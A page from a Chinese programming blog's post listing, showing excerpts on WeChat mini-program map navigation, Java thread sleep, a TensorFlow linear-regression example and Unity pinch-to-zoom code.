		<a class="list__footer-readmore btn" href="/posts/def2d82d04f0eb3f4f13d3940d60200d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4738186a9a918f9de71dc3e48bf55582/" rel="bookmark">
			微信小程序踩坑记录  -------  微信小程序如何开发常见的拉起外部地图软件进行导航的功能
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近在做一个项目，需要开发大家在手机上经常用到的地图导航，主要实现功能有三点：
一、在地址旁加一个按钮可以点击拉起微信内置地图
二、点击地图内的导航按钮可以跳转到想要的地图软件进行操作，如：高德、腾讯、苹果内置
其实第二步，微信已经全部封装好了，不需要我们多去操心。我们只需要做好如下几点就可以了：
一、使用小程序内置方法拉起微信内置地图
二、使用腾讯的微信小程序 JavaScript SDK 进行地址名称 ==&gt; 经纬度 的转换
三、使用微信内置API传递获取到的坐标值，使拉起导航能够正常使用
具体实现之后的效果如下所示：
代码如下所示： WXML &lt;image src="{{imgCommon}}addr.png" class="addr-image" bindtap="mapNavigation" data-addr="{{classdata.address}}"&gt;&lt;/image&gt; 其中 bindtap 中设置的是点击之后js中的方法名，这个大家都知道；重点是 data-addr 中的参数，这个参数的值是我们最终想要导航到的地址名，比如 北京市海淀区清河五彩城，我这里的代码这个必须设置，不然我们最终实现的效果会出现，导航没有目的地。那这导航做的就没有意义了。
js // 引入SDK核心类 var QQMapWX = require('../../utils/qqmap-wx-jssdk.min.js') var qqmapsdk; page({ data: { } // 点击按钮触发方法 mapNavigation: function (e) { console.log(e.target.dataset.addr); var addr = e.target.dataset.addr; var that = this; // 使用 JavaScript SDK 获取目的地经纬度 // 实例化API核心类 qqmapsdk = new QQMapWX({ key: '申请的腾讯地图key值' }); qqmapsdk.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4738186a9a918f9de71dc3e48bf55582/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/819404548f00b097dc631067bcb7ac17/" rel="bookmark">
			多线程-线程休眠（sleep）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. sleep()介绍
sleep() 定义在Thread.java中。
sleep() 的作用是让当前线程休眠，即当前线程会从“运行状态”进入到“休眠(阻塞)状态”。sleep()会指定休眠时间，线程休眠的时间会大于/等于该休眠时间；在线程重新被唤醒时，它会由“阻塞状态”变成“就绪状态”，从而等待cpu的调度执行。
2. sleep()示例 下面通过一个简单示例演示sleep()的用法。
//SleepTest.java的源码 class ThreadA extends Thread{ public ThreadA(String name){ super(name); } public synchronized void run() { try { for(int i=0; i &lt;10; i++){ System.out.printf("%s: %d\n", this.getName(), i); // i能被4整除时，休眠100毫秒 if (i%4 == 0) Thread.sleep(100); } } catch (InterruptedException e) { e.printStackTrace(); } } } public class SleepTest{ public static void main(String[] args){ ThreadA t1 = new ThreadA("t1"); t1.start(); } } 运行结果：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/819404548f00b097dc631067bcb7ac17/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/816b9423866bed55007d4799766c312a/" rel="bookmark">
			第一课：使用TensorFlow创建神经网络拟合线性函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		import tensorflow as tf import numpy as np #import matplot as plt #create data x_data=np.random.rand(200).astype(np.float32) y_data=0.1*x_data+0.3 #create structure of Neural Network #设置变量,并初始化 Weights=tf.Variable(tf.random_uniform([1],-1.0,1.0))#权重初始值为-1到1之间的一个数 biases=tf.Variable(tf.zeros(1))#偏置初始值为0 y=Weights*x_data+biases loss=tf.reduce_mean(tf.square(y-y_data))#使用L1正则作为目标函数 #设置优化器，使用梯度下降 optimizer=tf.train.GradientDescentOptimizer(0.5)#0.5为定义的学习率 train=optimizer.minimize(loss)#最小化目标函数 #init=tf.initialize_all_variables()#用于激活初始化函数 init=tf.tf.global_variables_initializer() #create structure end #激活tf中的会话 sess=tf.Session() sess.run(init) for step in range(201):#设置总的迭代步数为201步 sess.run(train) if step%20==0: print(step,sess.run(Weights),sess.run(biases)) running result: WARNING:tensorflow:From &lt;ipython-input-3-0eb2a08f92c0&gt;:21: initialize_all_variables (from tensorflow.python.ops.variables) is deprecated and will be removed after 2017-03-02. Instructions for updating: Use `tf.global_variables_initializer` instead. 0 [0.5747759] [0.04398211] 20 [0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/816b9423866bed55007d4799766c312a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/36fc761d22a10d6534d774bcb792a2c2/" rel="bookmark">
			地图放大缩小，以两指中间的点为锚点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		地图放大缩小，以两指中间的点为锚点 该代码使用插件Easy Touch ，DoTween using DG.Tweening; using UnityEngine; using HedgehogTeam.EasyTouch; public class MapFixedPointZoom : MonoBehaviour { public float MaxScale = 1.5f; public float MinScale = 1f; public RectTransform Map; public RectTransform Canvas; public RectTransform People; public void OnEnable() { EasyTouch.On_Pinch += On_Pinch; //EasyTouch.On_Drag += On_Drag; } public void OnDestroy() { EasyTouch.On_Pinch -= On_Pinch; //EasyTouch.On_Drag -= On_Drag; } private void On_Drag(Gesture gesture) { XYLimit(); } public void OnDrap() { XYLimit(); } public void Tap() { var pos = ScreenPos2MapPos(Input.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/36fc761d22a10d6534d774bcb792a2c2/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/191/">«</a>
	<span class="pagination__item pagination__item--current">192/220</span>
	<a class="pagination__item pagination__item--next btn" href="/page/193/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程中国的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>